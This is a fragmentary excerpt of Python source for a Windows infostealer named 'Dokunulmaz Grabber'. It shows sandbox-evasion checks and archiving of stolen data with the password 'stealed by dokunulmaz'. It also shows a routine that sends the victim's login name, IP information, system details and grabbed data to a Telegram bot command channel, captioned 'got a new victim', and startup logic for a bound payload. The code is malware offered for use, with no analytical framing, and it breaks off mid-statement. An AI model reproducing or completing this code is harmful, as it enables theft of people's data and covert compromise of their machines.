...
Logger = logging.getLogger("Dokunulmaz Grabber")
...
class VmProtect:
    ...
    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
        ...
        try:
            http.request('GET', f'https://dokunulamaz-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True
...
class DokunulmazGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "stealed by dokunulmaz"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Dokunulmaz-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Dokunulmaz Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.dokunulmaz")):
        try:
